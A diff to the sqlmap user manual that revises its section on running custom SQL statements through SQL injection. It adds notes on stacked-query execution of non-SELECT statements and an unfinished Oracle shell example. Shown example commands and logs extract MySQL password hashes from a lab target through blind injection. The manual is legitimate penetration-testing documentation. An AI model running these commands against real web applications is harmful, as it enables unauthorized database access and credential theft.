@@ -3356,15 +3356,19 @@ as a users' database.
 
 <sect2>Run your own SQL statement
 
-<!-- TODO: improve with example on INSERT/DROP/xp_cmdshell -->
-
 <p>
 Options: <tt>--sql-query</tt> and <tt>--sql-shell</tt>
 
 <p>
 The SQL query and the SQL shell features makes the user able to run
-whatever <tt>SELECT</tt> statement on the web application's back-end
-database management system and retrieve its output.
+custom SQL statement on the web application's back-end database management.
+sqlmap automatically recognize the type of SQL statement provided and
+choose which SQL injection technique to use to execute it: if it is a
+<tt>SELECT</tt> statement it will retrieve its output through the blind SQL
+injection or UNION query SQL injection technique depending on the user's
+options, otherwise it will execute the query through the stacked query
+SQL injection technique if the web application supports multiple
+statements on the back-end database management system.
 
 <p>
 Examples on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
@@ -3402,9 +3406,9 @@ SELECT 'foo', 'bar':    'foo, bar'
 <p>
 As you can see from this last example, sqlmap splits the query in two
 different <tt>SELECT</tt> statement to be able to retrieve the output even
-when using blind SQL injection technique.
-Otherwise in inband SQL injection technique it only perform a single HTTP
-request to get the user's query output:
+when using the blind SQL injection technique.
+Otherwise in UNION query SQL injection technique it only performs a single
+HTTP request to get the user's query output:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql-query \
@@ -3429,22 +3433,12 @@ SELECT 'foo', 'bar' [1]:
 </verb></tscreen>
 
 <p>
-Examples on an <bf>Oracle XE 10.2.0.1</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --sql-query \
-  "SELECT 'foo' FROM dual" -v 0
-
-[hh:mm:04] [INPUT] does the SQL query that you provide might return multiple entries? [Y/n] n
-SELECT 'foo' FROM dual:    'foo'
-</verb></tscreen>
-
-<p>
-As you can see, if your <tt>SELECT</tt> statement contains a <tt>FROM</tt>
-clause, sqlmap asks the user if such statement can return multiple entries
-and in such case the tool knows how to unpack the query correctly to
-retrieve its whole output line per line when going through blind SQL
-injection technique.
+If your <tt>SELECT</tt> statement contains a <tt>FROM</tt> clause, sqlmap
+asks the user if such statement can return multiple entries and in such
+case the tool knows how to unpack the query correctly to retrieve its
+whole output entry per entry when going through blind SQL injection
+technique. Through UNION query SQL injection it retrieved the whole output
+in a single response.
 
 <p>
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
@@ -3453,9 +3447,9 @@ Example on a <bf>PostgreSQL 8.3.5</bf> target:
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --sql-query \
   "SELECT usename FROM pg_user" -v 0
 
-[hh:mm:47] [INPUT] does the SQL query that you provide might return multiple entries? [Y/n] y
-[hh:mm:48] [INPUT] the SQL query that you provide can return up to 3 entries. How many 
-entries do you want to retrieve?
+[hh:mm:32] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
+[hh:mm:37] [INPUT] the SQL query provided can return up to 2 entries. How many entries 
+do you want to retrieve?
 [a] All (default)
 [#] Specific number
 [q] Quit
@@ -3466,71 +3460,61 @@ SELECT usename FROM pg_user [2]:
 </verb></tscreen>
 
 <p>
-As you can see from the last example, sqlmap counts the number of entries
-for your query and asks how many entries from the top you want to dump.
+As you can see from the last example, sqlmap counted the number of entries
+for your query and asks how many entries you want to dump.
 Otherwise if you specify also the <tt>LIMIT</tt>, or similar, clause
-sqlmap will not ask anything, just unpack the query and return its
-output line per line when going through blind SQL injection technique.
+sqlmap will not ask anything, it just unpacks the query and return its
+output entry per entry when going through blind SQL injection technique.
+Through UNION query SQL injection it retrieved the whole output in a
+single response.
 
 <p>
 Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-query \
-  "SELECT user, host, password FROM mysql.user LIMIT 1, 3" -v 1
+  "SELECT host, password FROM mysql.user LIMIT 1, 3" -v 1
 
 [...]
 back-end DBMS:  MySQL >= 5.0.0
 
-[hh:mm:11] [INFO] fetching SQL SELECT query output: 'SELECT user, host, password FROM 
+[hh:mm:22] [INFO] fetching SQL SELECT statement query output: 'SELECT host, password FROM 
 mysql.user LIMIT 1, 3'
-[hh:mm:12] [INFO] the SQL query provided has more than a field. sqlmap will now unpack 
-it into distinct queries to be able to retrieve the output even if we are going blind
-[hh:mm:12] [INFO] query: SELECT IFNULL(CAST(user AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 1, 1
-[hh:mm:12] [INFO] retrieved: root
-[hh:mm:12] [INFO] performed 34 queries in 0 seconds
-[hh:mm:12] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 1, 1
-[hh:mm:12] [INFO] retrieved: localhost
-[hh:mm:12] [INFO] performed 69 queries in 0 seconds
-[hh:mm:12] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 1, 1
-[hh:mm:12] [INFO] retrieved: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
-[hh:mm:13] [INFO] performed 293 queries in 0 seconds
-[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(user AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 2, 1
-[hh:mm:13] [INFO] retrieved: root
-[hh:mm:13] [INFO] performed 34 queries in 0 seconds
-[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 2, 1
-[hh:mm:13] [INFO] retrieved: leboyer
-[hh:mm:13] [INFO] performed 55 queries in 0 seconds
-[hh:mm:13] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 2, 1
-[hh:mm:13] [INFO] retrieved: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
-[hh:mm:14] [INFO] performed 293 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT IFNULL(CAST(user AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 3, 1
-[hh:mm:14] [INFO] retrieved: root
-[hh:mm:14] [INFO] performed 34 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 3, 1
-[hh:mm:14] [INFO] retrieved: 192.168.1.121
-[hh:mm:14] [INFO] performed 69 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM mysql.user 
-ORDER BY user ASC LIMIT 3, 1
-[hh:mm:14] [INFO] retrieved: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
-[hh:mm:15] [INFO] performed 293 queries in 0 seconds
-SELECT user, host, password FROM mysql.user LIMIT 1, 3 [3]:
-[*] root, localhost, *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
-[*] root, leboyer, *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
-[*] root, 192.168.1.121, *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
+[hh:mm:22] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it 
+into distinct queries to be able to retrieve the output even if we are going blind
+[hh:mm:22] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
+mysql.user LIMIT 1, 1
+[hh:mm:22] [INFO] retrieved: localhost
+[hh:mm:22] [INFO] performed 69 queries in 0 seconds
+[hh:mm:22] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM 
+mysql.user LIMIT 1, 1
+[hh:mm:22] [INFO] retrieved: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+[hh:mm:24] [INFO] performed 293 queries in 2 seconds
+[hh:mm:24] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
+mysql.user LIMIT 2, 1
+[hh:mm:24] [INFO] retrieved: localhost
+[hh:mm:25] [INFO] performed 69 queries in 0 seconds
+[hh:mm:25] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) FROM 
+mysql.user LIMIT 2, 1
+[hh:mm:25] [INFO] retrieved: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+[hh:mm:27] [INFO] performed 293 queries in 2 seconds
+[hh:mm:27] [INFO] query: SELECT IFNULL(CAST(host AS CHAR(10000)), CHAR(32)) FROM 
+mysql.user LIMIT 3, 1
+[hh:mm:27] [INFO] retrieved: localhost
+[hh:mm:28] [INFO] performed 69 queries in 0 seconds
+[hh:mm:28] [INFO] query: SELECT IFNULL(CAST(password AS CHAR(10000)), CHAR(32)) 
+FROM mysql.user LIMIT 3, 1
+[hh:mm:28] [INFO] retrieved: 
+[hh:mm:28] [INFO] performed 6 queries in 0 seconds
+SELECT host, password FROM mysql.user LIMIT 1, 3 [3]:
+[*] localhost, *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+[*] localhost, *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+[*] localhost, 
 </verb></tscreen>
 
 <p>
 The SQL shell option gives you access to run your own SQL statement
-interactively, like a SQL console logged into the back-end database
+interactively, like a SQL console logged to the back-end database
 management system.
 This feature has TAB completion and history support.
 
@@ -3700,6 +3684,21 @@ As you can see in this last example, if the <tt>SELECT</tt> statement has
 an asterisk instead of the column(s) name, sqlmap first retrieves the
 column names of the table then asks if the query can return multiple
 entries and goes on.
+
+<p>
+Example of SQL statement other than <tt>SELECT</tt> on an <bf>Oracle XE
+10.2.0.1</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --sql-shell -v 1
+
+[...]
+back-end DBMS: Oracle
+
+[hh:mm:20] [INFO] calling Oracle shell. To quit type 'x' or 'q' and press ENTER
+sql> TODO
+</verb></tscreen>
+
 
 
 <sect1>File system access
